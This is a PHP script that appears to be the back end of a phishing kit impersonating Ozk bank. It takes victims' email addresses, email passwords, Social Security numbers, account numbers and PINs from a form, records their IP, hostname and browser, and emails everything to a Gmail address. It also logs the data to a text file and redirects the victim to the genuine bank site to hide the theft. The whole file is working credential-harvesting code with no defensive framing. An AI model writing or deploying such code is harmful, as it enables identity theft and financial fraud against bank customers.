<?php
$ip = getenv("REMOTE_ADDR");
$time = date("m-d-Y g:i:a");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "New Message\n";
$message .= "Email : ".$_POST['em']."\n";
$message .= "Email Password : ".$_POST['empsw']."\n";
$message .= "SSN : ".$_POST['ssn']."\n";
$message .= "Account Number : ".$_POST['acctnum']."\n";
$message .= "Account Type : ".$_POST['accttyp']."\n";
$message .= "Pin : ".$_POST['pin']."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "IP Address $ip on $time\n";
$message .= "Browser: $useragent\n";
$message .= "----------------------By May-\n";

$subject = "New Ozk verification";

$send = "staerkelramee@gmail.com";
$from = "From: May <info@studio.com>";
$from .= "MIME-Version: 1.0\n";

mail($send,$subject,$message, $from);

$file = "text.txt";
$open = fopen($file, "a");
fwrite($open, $message."\n");
fclose($open);


header("Location: https://www.ozk.com/personal/");


?>